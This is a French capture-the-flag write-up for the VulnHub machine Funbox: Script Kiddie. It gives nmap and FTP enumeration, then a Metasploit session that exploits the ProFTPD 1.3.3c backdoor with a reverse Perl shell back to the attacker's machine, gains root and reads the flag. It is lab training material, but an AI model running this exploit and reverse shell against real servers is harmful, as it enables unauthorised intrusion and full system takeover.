{"hash":"b89929ffb278454bd1f8bb0277abaa50df9b43f7","data":{"post":{"title":"CTF Funbox: Script Kiddie","date":"15 August 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.2</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.17</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir FunboxScriptKiddie &amp;&amp; cd FunboxScriptKiddie</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -sV -sT -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT    STATE SERVICE     VERSION\n<span class=\"token number\">21</span>/tcp  <span class=\"token function\">open</span>  <span class=\"token function\">ftp</span>         ProFTPD <span class=\"token number\">1.3</span>.3c\n<span class=\"token number\">22</span>/tcp  <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>         OpenSSH <span class=\"token number\">7</span>.2p2 Ubuntu 4ubuntu2.10 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">25</span>/tcp  <span class=\"token function\">open</span>  smtp        Postfix smtpd\n<span class=\"token number\">80</span>/tcp  <span class=\"token function\">open</span>  http        Apache httpd <span class=\"token number\">2.4</span>.18 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span>\n<span class=\"token number\">110</span>/tcp <span class=\"token function\">open</span>  pop3        Dovecot pop3d\n<span class=\"token number\">139</span>/tcp <span class=\"token function\">open</span>  netbios-ssn Samba smbd <span class=\"token number\">3</span>.X - <span class=\"token number\">4</span>.X <span class=\"token punctuation\">(</span>workgroup: WORKGROUP<span class=\"token punctuation\">)</span>\n<span class=\"token number\">143</span>/tcp <span class=\"token function\">open</span>  imap        Dovecot imapd\n<span class=\"token number\">445</span>/tcp <span class=\"token function\">open</span>  netbios-ssn Samba smbd <span class=\"token number\">3</span>.X - <span class=\"token number\">4</span>.X <span class=\"token punctuation\">(</span>workgroup: WORKGROUP<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a une liste de 8 serveurs :</p>\n<ul>\n<li><strong>21</strong> un serveur <strong>FTP</strong> ;</li>\n<li><strong>22</strong> un serveur <strong>SSH</strong> ;</li>\n<li><strong>25</strong> un serveur <strong>SMTP</strong> ;</li>\n<li><strong>80</strong> un serveur <strong>Apache</strong> 2.4.18 ;</li>\n<li><strong>110</strong> un serveur <strong>POP3</strong> ;</li>\n<li><strong>139</strong> et <strong>445</strong> un serveur <strong>Samba</strong> ;</li>\n<li><strong>143</strong> un serveur <strong>IMAP</strong>.</li>\n</ul>\n<p>On check le serveur <strong>FTP</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ftp</span> <span class=\"token variable\">$IP</span>\nConnected to <span class=\"token number\">192.168</span>.1.17.\n<span class=\"token number\">220</span> ProFTPD <span class=\"token number\">1.3</span>.3c Server <span class=\"token punctuation\">(</span>ProFTPD Default Installation<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">192.168</span>.1.17<span class=\"token punctuation\">]</span>\nName <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.17:kali<span class=\"token punctuation\">)</span>: anonymous\n<span class=\"token number\">331</span> Anonymous login ok, send your complete email address as your password\nPassword:\n<span class=\"token number\">530</span> Login incorrect.\nLogin failed.\nftp<span class=\"token operator\">></span> <span class=\"token builtin class-name\">exit</span>\n<span class=\"token number\">221</span> Goodbye.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Sans grand succès, par contre lorsque l'on regarde sur <strong>searchsploit</strong> pour <strong>ProFTPD 1.3.3c</strong>, on a un résultat exploitable avec <strong>Metasploit</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">ProFTPd <span class=\"token number\">1.3</span>.3c - Compromised Source Backdoor Remote Code Execution <span class=\"token operator\">|</span> linux/remote/15662.txt\nProFTPd-1.3.3c - Backdoor Command Execution <span class=\"token punctuation\">(</span>Metasploit<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> linux/remote/16921.rb</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Pénétration</h2>\n<p>On lance donc ce dernier via la commande <strong>msfconsole</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ msfconsole\nmsf6 <span class=\"token operator\">></span> search ProFTPd-1.3.3c\n<span class=\"token comment\">#  Name                                    Disclosure Date  Rank       Check  Description</span>\n-  ----                                    ---------------  ----       -----  -----------\n<span class=\"token number\">0</span>  exploit/unix/ftp/proftpd_133c_backdoor  <span class=\"token number\">2010</span>-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On retrouve bien l'exploit que l'on veut utiliser.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 <span class=\"token operator\">></span> use <span class=\"token number\">0</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Avant de poursuivre, on regarde les options disponibles.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/ftp/proftpd_133c_backdoor<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> show options\nName    Current Setting  Required  Description\n----    ---------------  --------  -----------\nRHOSTS                   <span class=\"token function\">yes</span>       The target host<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>, range CIDR identifier, or hosts <span class=\"token function\">file</span> with syntax <span class=\"token string\">'file:&lt;path>'</span>\nRPORT   <span class=\"token number\">21</span>               <span class=\"token function\">yes</span>       The target port <span class=\"token punctuation\">(</span>TCP<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On commence par renseigner l'IP de la machine distante dans la variable \"RHOST\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/ftp/proftpd_133c_backdoor<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> RHOST <span class=\"token number\">192.168</span>.1.17\nRHOST <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">192.168</span>.1.17</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Puis on consulte la liste des payloads disponibles.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/ftp/proftpd_133c_backdoor<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> show payloads\n<span class=\"token comment\">#  Name                                        Disclosure Date  Rank    Check  Description</span>\n-  ----                                        ---------------  ----    -----  -----------\n<span class=\"token number\">0</span>  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP <span class=\"token punctuation\">(</span>via Perl<span class=\"token punctuation\">)</span>\n<span class=\"token number\">1</span>  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP <span class=\"token punctuation\">(</span>via perl<span class=\"token punctuation\">)</span> IPv6\n<span class=\"token number\">2</span>  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution\n<span class=\"token number\">3</span>  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP <span class=\"token punctuation\">(</span>telnet<span class=\"token punctuation\">)</span>\n<span class=\"token number\">4</span>  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL <span class=\"token punctuation\">(</span>telnet<span class=\"token punctuation\">)</span>\n<span class=\"token number\">5</span>  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP <span class=\"token punctuation\">(</span>via Perl<span class=\"token punctuation\">)</span>\n<span class=\"token number\">6</span>  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL <span class=\"token punctuation\">(</span>via perl<span class=\"token punctuation\">)</span>\n<span class=\"token number\">7</span>  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL <span class=\"token punctuation\">(</span>telnet<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On choisit le reverse en PERL dans la variable \"payload\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/ftp/proftpd_133c_backdoor<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> payload <span class=\"token number\">5</span>\npayload <span class=\"token operator\">=</span><span class=\"token operator\">></span> cmd/unix/reverse_perl</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Et on n'oublie pas de renseigner l'IP la machine locale dans la variable \"LHOST\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/ftp/proftpd_133c_backdoor<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> LHOST <span class=\"token number\">192.168</span>.1.33\nLHOST <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">192.168</span>.1.33</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Nos 3 valeurs renseignées, on peut exécuter l'exploit.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/ftp/proftpd_133c_backdoor<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> exploit\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Started reverse TCP handler on <span class=\"token number\">192.168</span>.1.33:4444 \n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> <span class=\"token number\">192.168</span>.1.17:21 - Sending Backdoor Command\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Command shell session <span class=\"token number\">1</span> opened <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.33:4444 -<span class=\"token operator\">></span> <span class=\"token number\">192.168</span>.1.17:44782<span class=\"token punctuation\">)</span> at <span class=\"token number\">2021</span>-08-15 <span class=\"token number\">10</span>:58:28 +0200</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>L'exploit fonctionne car on est connecté sur le serveur <strong>FTP</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>,65534<span class=\"token punctuation\">(</span>nogroup<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On est directement utilisateur <strong>root</strong>. On lance un <strong>shell</strong> pour mieux naviguer sur la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ shell\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Trying to <span class=\"token function\">find</span> binary <span class=\"token string\">'python'</span> on the target machine\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found python at /usr/bin/python\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Using <span class=\"token variable\"><span class=\"token variable\">`</span>python<span class=\"token variable\">`</span></span> to pop up an interactive shell\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Trying to <span class=\"token function\">find</span> binary <span class=\"token string\">'bash'</span> on the target machine\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found <span class=\"token function\">bash</span> at /bin/bash</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On trouve l'unique flag dans le répertoire de l'utilisateur <strong>root</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/root.txt\nPlease, tweet this to: @0815R2d2\nThank you<span class=\"token punctuation\">..</span>.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/funbox-scriptkiddie,725","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":4,"parts":[{"title":"CTF Funbox: Easy","href":"ctf-funbox-easy"},{"title":"CTF Funbox: Script Kiddie","href":""}]}},"context":{}}